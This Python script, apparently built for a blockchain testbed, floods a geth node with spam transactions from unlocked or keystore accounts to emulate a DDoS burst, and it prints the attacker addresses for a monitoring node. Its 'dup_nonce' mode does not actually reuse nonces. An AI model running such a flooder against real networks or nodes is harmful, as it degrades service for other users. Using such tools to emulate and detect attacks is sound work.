#!/usr/bin/env python3
"""Inject malicious-style transactions to emulate a DDoS burst."""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from getpass import getpass

from web3 import Web3
from eth_account import Account


def positive_int(value: str) -> int:
    ivalue = int(value, 0)
    if ivalue <= 0:
        raise argparse.ArgumentTypeError("value must be positive")
    return ivalue


def non_negative_int(value: str) -> int:
    ivalue = int(value, 0)
    if ivalue < 0:
        raise argparse.ArgumentTypeError("value must be non-negative")
    return ivalue


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Send crafted DDoS attack transactions via IPC/RPC.")
    parser.add_argument("--ipc", help="Path to the local geth IPC endpoint")
    parser.add_argument("--rpc", help="HTTP RPC URL to connect a remote geth endpoint")
    parser.add_argument(
        "--from-index",
        type=int,
        help="Index of attacker account in eth.accounts; auto round-robin across accounts when omitted",
    )
    parser.add_argument(
        "--target",
        help="Target address to receive the spam; auto rotates through available accounts when omitted",
    )
    parser.add_argument("--count", type=positive_int, default=200, help="Number of attack transactions to emit")
    parser.add_argument("--mode", choices=["dup_nonce", "low_gas"], default="dup_nonce", help="Attack pattern to use")
    parser.add_argument("--gas", type=positive_int, default=100000, help="Gas limit per attack transaction")
    parser.add_argument("--gas-price-wei", type=non_negative_int, help="Explicit gas price override (wei)")
    parser.add_argument("--value-wei", type=non_negative_int, default=0, help="Transfer value per attack tx")
    parser.add_argument("--passphrase", help="Passphrase applied to all attacker accounts; prompts if omitted")
    parser.add_argument("--duration", type=positive_int, default=3600, help="Unlock duration in seconds")
    parser.add_argument("--interval", type=float, default=0.05, help="Delay between sends in seconds")
    parser.add_argument(
        "--keystore-env",
        default="ATTACKER_KEYSTORE",
        help="Environment variable containing a keystore JSON for raw-signing attacks",
    )
    args = parser.parse_args()

    if bool(args.ipc) == bool(args.rpc):
        parser.error("必须在 --ipc 与 --rpc 中二选一")

    return args


def ensure_connected(w3: Web3) -> None:
    if not w3.is_connected():
        raise SystemExit("Failed to connect to geth IPC endpoint")


def unlock_account(w3: Web3, address: str, passphrase: str, duration: int) -> bool:
    """Unlock an account using geth personal API, with legacy fallback."""

    personal = getattr(getattr(w3, "geth", None), "personal", None)
    if personal and hasattr(personal, "unlock_account"):
        return bool(personal.unlock_account(address, passphrase, duration))

    provider = getattr(w3, "provider", None)
    if provider and hasattr(provider, "make_request"):
        response = provider.make_request(
            "personal_unlockAccount", [address, passphrase, duration]
        )
        if response.get("error"):
            raise SystemExit(
                f"personal_unlockAccount failed for {address}: {response['error']}"
            )
        return bool(response.get("result"))

    raise SystemExit("personal_unlockAccount API not available; enable personal namespace on geth")


def main() -> None:
    args = parse_args()
    if args.ipc:
        provider = Web3.IPCProvider(args.ipc, timeout=30)
    else:
        provider = Web3.HTTPProvider(args.rpc, request_kwargs={"timeout": 30})

    w3 = Web3(provider)
    ensure_connected(w3)

    keystore_json = os.getenv(args.keystore_env, "").strip()
    private_keys: dict[str, bytes] = {}

    accounts = w3.eth.accounts
    checksum_accounts = [Web3.to_checksum_address(acct) for acct in accounts]

    if keystore_json:
        try:
            keystore = json.loads(keystore_json)
        except json.JSONDecodeError as exc:  # noqa: NIV001
            raise SystemExit(f"Failed to parse keystore from {args.keystore_env}: {exc}") from exc

        keystore_passphrase = args.passphrase or getpass("Passphrase for keystore account: ")
        try:
            private_key_bytes = Account.decrypt(keystore, keystore_passphrase)
        except ValueError as exc:  # noqa: NIV001
            raise SystemExit(f"Failed to decrypt keystore {args.keystore_env}: {exc}") from exc

        account_obj = Account.from_key(private_key_bytes)
        checksum_address = Web3.to_checksum_address(account_obj.address)
        attacker_accounts = [checksum_address]
        private_keys[checksum_address] = private_key_bytes
        passphrase = keystore_passphrase
    else:
        if not checksum_accounts:
            raise SystemExit("No accounts available on the connected node")

        if args.from_index is not None:
            if args.from_index < 0 or args.from_index >= len(checksum_accounts):
                raise SystemExit(
                    f"from-index {args.from_index} out of range; accounts available: {len(checksum_accounts)}"
                )
            attacker_accounts = [checksum_accounts[args.from_index]]
        else:
            attacker_accounts = checksum_accounts[:]

        if not attacker_accounts:
            raise SystemExit("No attacker accounts selected")

        passphrase = args.passphrase or getpass("Passphrase for attacker accounts: ")

    fallback_candidates = {}
    fallback_positions = {}
    for attacker_addr in attacker_accounts:
        candidates = [acct for acct in checksum_accounts if acct != attacker_addr]
        if candidates:
            fallback_candidates[attacker_addr] = candidates
            fallback_positions[attacker_addr] = 0

    fixed_target = Web3.to_checksum_address(args.target) if args.target else None
    if fixed_target is None:
        for attacker_addr in attacker_accounts:
            if attacker_addr not in fallback_candidates:
                if keystore_json:
                    raise SystemExit(
                        f"Attacker {attacker_addr} requires --target when using external keystore"
                    )
                raise SystemExit(
                    f"Attacker {attacker_addr} has no alternate recipient; specify --target or add more accounts"
                )
    else:
        for attacker_addr in attacker_accounts:
            if attacker_addr == fixed_target and attacker_addr not in fallback_candidates:
                raise SystemExit(
                    f"Attacker {attacker_addr} equals fixed target {fixed_target}; add more accounts or choose a different --target"
                )

    env_command = "export ATTACKER_ACCOUNTS=" + ",".join(attacker_accounts)
    print(f"[ATTACK] selected attacker accounts: {', '.join(attacker_accounts)}")
    print(env_command)
    print("[ATTACK] Pausing 5 seconds so you can copy the command above to the monitoring node...")
    time.sleep(5)

    gas_price = args.gas_price_wei or max(w3.eth.gas_price // 20, 1)

    if not private_keys:
        for attacker_addr in attacker_accounts:
            if not unlock_account(w3, attacker_addr, passphrase, args.duration):
                raise SystemExit(f"Failed to unlock attacker account {attacker_addr}")

    base_nonces = {
        attacker_addr: w3.eth.get_transaction_count(attacker_addr, "pending") for attacker_addr in attacker_accounts
    }
    sent_counts = {attacker_addr: 0 for attacker_addr in attacker_accounts}

    dup_payload = Web3.to_hex(b"ddos" * 8)
    chain_id = w3.eth.chain_id

    for idx in range(args.count):
        attacker = attacker_accounts[idx % len(attacker_accounts)]
        sent_so_far = sent_counts[attacker]

        nonce = base_nonces[attacker] + sent_so_far

        if fixed_target:
            recipient = fixed_target
            if recipient == attacker:
                fallback = fallback_candidates.get(attacker)
                if not fallback:
                    raise SystemExit(
                        f"Attacker {attacker} cannot use fixed target {fixed_target}; add more accounts or adjust target"
                    )
                pos = fallback_positions[attacker]
                recipient = fallback[pos % len(fallback)]
                fallback_positions[attacker] = (pos + 1) % len(fallback)
        else:
            fallback = fallback_candidates.get(attacker)
            if not fallback:
                raise SystemExit(
                    f"Attacker {attacker} has no recipient candidates; specify --target or add more accounts"
                )
            pos = fallback_positions[attacker]
            recipient = fallback[pos % len(fallback)]
            fallback_positions[attacker] = (pos + 1) % len(fallback)

        payload = dup_payload if args.mode == "dup_nonce" else Web3.to_hex(os.urandom(16))

        tx = {
            "from": attacker,
            "to": recipient,
            "value": args.value_wei,
            "gas": args.gas,
            "gasPrice": gas_price,
            "nonce": nonce,
            "data": payload,
        }

        try:
            if attacker in private_keys:
                raw_tx = tx.copy()
                raw_tx["chainId"] = chain_id
                signed_tx = Account.sign_transaction(raw_tx, private_keys[attacker])
                tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            else:
                tx_hash = w3.eth.send_transaction(tx)
            print(
                f"[ATTACK] tx {idx + 1}/{args.count} hash={tx_hash.hex()} from={attacker} to={recipient} nonce={nonce}"
            )
        except Exception as exc:  # noqa: BLE001
            print(
                f"[ATTACK] error sending tx {idx + 1}/{args.count} from={attacker} to={recipient}: {exc}",
                file=sys.stderr,
            )
        sent_counts[attacker] = sent_so_far + 1
        if idx + 1 < args.count:
            time.sleep(max(args.interval, 0.0))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Interrupted by user", file=sys.stderr)
